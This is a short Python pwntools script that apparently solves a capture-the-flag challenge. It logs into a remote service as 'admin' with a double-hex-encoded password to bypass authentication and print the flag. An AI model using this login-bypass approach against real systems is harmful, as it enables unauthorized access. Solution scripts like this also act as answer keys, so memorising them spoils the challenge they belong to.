from pwn import context, remote

def solution(host: str, port: str) -> str:
    context.update({"log_level":"error"})
    with remote(host, port) as rem:
        rem.sendlineafter(b"1. Create Account\n2. Login\n3. Change Password\n(1, 2, 3)> ", str(2).encode())
        rem.sendlineafter(b"Login: ", b"admin")
        rem.sendlineafter(b"Password: ", b"admin".hex().encode().hex().encode())
        rem.recvuntil(b"Congratulations! Here is your flag: ")
        flag = rem.recvline().strip().decode()
    return flag

if __name__ == "__main__":
    host = "challenge.secso.cc"
    port = "7002"
    print(solution(host, port))
    